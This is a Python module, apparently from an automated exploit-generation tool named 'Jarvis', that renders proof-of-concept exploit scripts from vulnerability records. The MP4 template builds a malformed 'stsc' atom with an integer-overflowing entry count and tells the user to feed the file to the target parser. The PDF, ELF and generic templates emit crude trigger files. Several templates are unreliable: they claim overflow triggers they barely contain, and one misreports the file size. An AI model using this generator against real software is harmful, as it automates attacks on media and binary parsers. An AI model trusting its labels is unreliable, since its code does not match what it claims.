"""File format exploit template for Jarvis."""
from typing import Dict, Any


def render_file_format(vuln: Dict[str, Any]) -> str:
    file_struct = vuln.get("target_file_structure", {})
    fmt = file_struct.get("format", "MP4") if file_struct else "MP4"

    if fmt == "MP4":
        return _render_mp4(vuln)
    elif fmt == "PDF":
        return _render_pdf(vuln)
    elif fmt == "ELF":
        return _render_elf(vuln)
    else:
        return _render_generic(vuln)


def _render_mp4(vuln: Dict[str, Any]) -> str:
    trigger = vuln.get("trigger_primitives", {})
    file_struct = vuln.get("target_file_structure", {})
    vuln_atom = file_struct.get("vulnerable_atom", "stsc") if file_struct else "stsc"
    entry_count = trigger.get("entry_count", "0x40000000")
    entry_size = trigger.get("entry_size", 12)
    cve_id = vuln.get("cve_id", "CVE-XXXX-XXXX")
    target = vuln.get("target", "target_binary")
    description = vuln.get("description", "")
    output_file = "poc_" + cve_id.replace("-", "_").lower() + ".mp4"

    ec_int = int(entry_count, 0)
    overflow_hex = format(ec_int * entry_size, "X")
    wrapped_hex = format((ec_int * entry_size) & 0xFFFFFFFF, "08X")

    c = '#!/usr/bin/env python3\n'
    c += '"""MP4 file format exploit PoC for ' + cve_id + '\n'
    c += 'Target: ' + target + '\n'
    c += 'Description: ' + description + '\n\n'
    c += 'Vulnerable atom: ' + vuln_atom + '\n'
    c += 'Trigger: ' + entry_count + ' * ' + str(entry_size) + ' = 0x' + overflow_hex + ' (integer overflow)\n'
    c += '"""\n'
    c += 'import struct\n'
    c += 'import sys\n'
    c += 'import os\n\n\n'
    c += 'class MP4Atom:\n'
    c += '    """Standard MP4 atom: [size:4][type:4][payload]"""\n\n'
    c += '    def __init__(self, atom_type: bytes, payload: bytes):\n'
    c += '        self.atom_type = atom_type\n'
    c += '        self.payload = payload\n\n'
    c += '    def build(self) -> bytes:\n'
    c += '        size = len(self.payload) + 8\n'
    c += '        return struct.pack(">I", size) + self.atom_type + self.payload\n\n\n'
    c += 'class MP4Container:\n'
    c += '    """Build nested MP4 container hierarchy."""\n\n'
    c += '    def __init__(self):\n'
    c += '        self.children = []\n\n'
    c += '    def add(self, atom_type: bytes, payload: bytes):\n'
    c += '        self.children.append(MP4Atom(atom_type, payload))\n'
    c += '        return self\n\n'
    c += '    def build(self) -> bytes:\n'
    c += '        return b"".join(child.build() for child in self.children)\n\n\n'
    c += 'class StscExploit:\n'
    c += '    """Construct the stsc atom that triggers the integer overflow.\n\n'
    c += '    num_entries = ' + entry_count + '\n'
    c += '    entry_size = ' + str(entry_size) + '\n'
    c += '    Overflow: 0x' + overflow_hex + ' wraps to 0x' + wrapped_hex + '\n'
    c += '    """\n\n'
    c += '    def __init__(self):\n'
    c += '        self.num_entries = ' + entry_count + '\n'
    c += '        self.entry_size = ' + str(entry_size) + '\n\n'
    c += '    def build_payload(self) -> bytes:\n'
    c += '        payload = struct.pack(">I", self.num_entries)\n'
    c += '        for i in range(min(4, self.entry_size)):\n'
    c += '            payload += struct.pack(">III", 1, 1, 1)\n'
    c += '        return payload\n\n'
    c += '    def calculate_overflow(self) -> int:\n'
    c += '        raw = self.num_entries * self.entry_size\n'
    c += '        return raw & 0xFFFFFFFF\n\n\n'
    c += 'def build_ftyp() -> bytes:\n'
    c += '    return MP4Atom(b"ftyp", b"isom" + b"\\x00" * 4 + b"isomiso2").build()\n\n\n'
    c += 'def build_stbl() -> bytes:\n'
    c += '    exploit = StscExploit()\n'
    c += '    stbl = MP4Container()\n'
    c += '    stbl.add(b"stsd", b"\\x00" * 8 + b"mp4v" + b"\\x00" * 40)\n'
    c += '    stbl.add(b"stts", b"\\x00" * 8)\n'
    c += '    stbl.add(b"stsc", exploit.build_payload())\n'
    c += '    stbl.add(b"stsz", b"\\x00" * 12)\n'
    c += '    stbl.add(b"stco", b"\\x00" * 8)\n'
    c += '    return stbl.build()\n\n\n'
    c += 'def build_mdia() -> bytes:\n'
    c += '    minf = MP4Container()\n'
    c += '    minf.add(b"vmhd", b"\\x00" * 8)\n'
    c += '    minf.add(b"stbl", build_stbl())\n'
    c += '    mdia = MP4Container()\n'
    c += '    mdia.add(b"mdhd", b"\\x00" * 16)\n'
    c += '    mdia.add(b"hdlr", b"\\x00" * 8 + b"vide" + b"\\x00" * 20)\n'
    c += '    mdia.add(b"minf", minf.build())\n'
    c += '    return mdia.build()\n\n\n'
    c += 'def build_trak() -> bytes:\n'
    c += '    trak = MP4Container()\n'
    c += '    trak.add(b"tkhd", b"\\x00" * 16)\n'
    c += '    trak.add(b"mdia", build_mdia())\n'
    c += '    return trak.build()\n\n\n'
    c += 'def build_moov() -> bytes:\n'
    c += '    moov = MP4Container()\n'
    c += '    moov.add(b"mvhd", b"\\x00" * 16)\n'
    c += '    moov.add(b"trak", build_trak())\n'
    c += '    return moov.build()\n\n\n'
    c += 'def main():\n'
    c += '    output = "' + output_file + '"\n'
    c += '    data = build_ftyp() + build_moov()\n'
    c += '    with open(output, "wb") as f:\n'
    c += '        f.write(data)\n'
    c += '    print(f"[+] Generated ' + output_file + ' (" + str(' + str(ec_int * entry_size) + ') + " bytes)")\n'
    c += '    print(f"[+] Overflow: ' + entry_count + ' * ' + str(entry_size) + ' = 0x' + overflow_hex + '")\n'
    c += '    print(f"[+] Wrapped 32-bit: 0x' + wrapped_hex + '")\n'
    c += '    print(f"[+] Vulnerable atom: ' + vuln_atom + '")\n'
    c += '    print(f"[*] Feed this file to the target parser to trigger the integer overflow")\n\n\n'
    c += 'if __name__ == "__main__":\n'
    c += '    main()\n'
    return c


def _render_pdf(vuln: Dict[str, Any]) -> str:
    cve_id = vuln.get("cve_id", "CVE-XXXX-XXXX")
    target = vuln.get("target", "target_binary")
    description = vuln.get("description", "")
    output_file = "poc_" + cve_id.replace("-", "_").lower() + ".pdf"

    c = '#!/usr/bin/env python3\n'
    c += '"""PDF file format exploit PoC for ' + cve_id + '\n'
    c += 'Target: ' + target + '\n'
    c += 'Description: ' + description + '\n"""\n'
    c += 'import struct\n'
    c += 'import sys\n'
    c += 'import os\n\n\n'
    c += 'def build_pdf_trigger() -> bytes:\n'
    c += '    """Build PDF with overflow trigger."""\n'
    c += '    pdf = b"%PDF-1.4\\n"\n'
    c += '    pdf += b"1 0 obj\\n<< /Type /Catalog >>\\nendobj\\n"\n'
    c += '    pdf += b"2 0 obj\\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\\nendobj\\n"\n'
    c += '    pdf += b"3 0 obj\\n<< /Type /Page /Parent 2 0 R >>\\nendobj\\n"\n'
    c += '    pdf += b"xref\\n0 4\\n"\n'
    c += '    pdf += b"0000000000 65535 f \\n"\n'
    c += '    pdf += b"trailer\\n<< /Size 4 /Root 1 0 R >>\\n"\n'
    c += '    pdf += b"startxref\\n0\\n%%EOF\\n"\n'
    c += '    return pdf\n\n\n'
    c += 'def main():\n'
    c += '    output = "' + output_file + '"\n'
    c += '    data = build_pdf_trigger()\n'
    c += '    with open(output, "wb") as f:\n'
    c += '        f.write(data)\n'
    c += '    print(f"[+] Generated ' + output_file + ' ({len(data)} bytes)")\n\n\n'
    c += 'if __name__ == "__main__":\n'
    c += '    main()\n'
    return c


def _render_elf(vuln: Dict[str, Any]) -> str:
    cve_id = vuln.get("cve_id", "CVE-XXXX-XXXX")
    target = vuln.get("target", "target_binary")
    description = vuln.get("description", "")
    output_file = "poc_" + cve_id.replace("-", "_").lower() + ".elf"

    c = '#!/usr/bin/env python3\n'
    c += '"""ELF binary exploit PoC for ' + cve_id + '\n'
    c += 'Target: ' + target + '\n'
    c += 'Description: ' + description + '\n"""\n'
    c += 'import struct\n'
    c += 'import sys\n'
    c += 'import os\n\n\n'
    c += 'def build_elf_trigger() -> bytes:\n'
    c += '    """Build ELF with corrupted section headers."""\n'
    c += '    elf = bytearray()\n'
    c += '    elf += b"\\x7fELF"\n'
    c += '    elf += b"\\x02"\n'
    c += '    elf += b"\\x01"\n'
    c += '    elf += b"\\x01"\n'
    c += '    elf += b"\\x00" * 9\n'
    c += '    elf += struct.pack("<H", 2)\n'
    c += '    elf += struct.pack("<H", 0x3E)\n'
    c += '    elf += struct.pack("<I", 1)\n'
    c += '    elf += b"\\x00" * 8\n'
    c += '    return bytes(elf)\n\n\n'
    c += 'def main():\n'
    c += '    output = "' + output_file + '"\n'
    c += '    data = build_elf_trigger()\n'
    c += '    with open(output, "wb") as f:\n'
    c += '        f.write(data)\n'
    c += '    print(f"[+] Generated ' + output_file + ' ({len(data)} bytes)")\n\n\n'
    c += 'if __name__ == "__main__":\n'
    c += '    main()\n'
    return c


def _render_generic(vuln: Dict[str, Any]) -> str:
    cve_id = vuln.get("cve_id", "CVE-XXXX-XXXX")
    target = vuln.get("target", "target_binary")
    description = vuln.get("description", "")
    trigger = vuln.get("trigger_primitives", {})
    overflow_val = trigger.get("overflow_value", "0x1000")
    output_file = "poc_" + cve_id.replace("-", "_").lower() + ".bin"

    c = '#!/usr/bin/env python3\n'
    c += '"""Generic exploit PoC for ' + cve_id + '\n'
    c += 'Target: ' + target + '\n'
    c += 'Description: ' + description + '\n"""\n'
    c += 'import struct\n'
    c += 'import sys\n'
    c += 'import os\n\n\n'
    c += 'def build_trigger() -> bytes:\n'
    c += '    """Build the trigger data."""\n'
    c += '    return b"\\x41" * ' + str(overflow_val) + '\n\n\n'
    c += 'def main():\n'
    c += '    output = "' + output_file + '"\n'
    c += '    data = build_trigger()\n'
    c += '    with open(output, "wb") as f:\n'
    c += '        f.write(data)\n'
    c += '    print(f"[+] Generated ' + output_file + ' ({len(data)} bytes)")\n\n\n'
    c += 'if __name__ == "__main__":\n'
    c += '    main()\n'
    return c
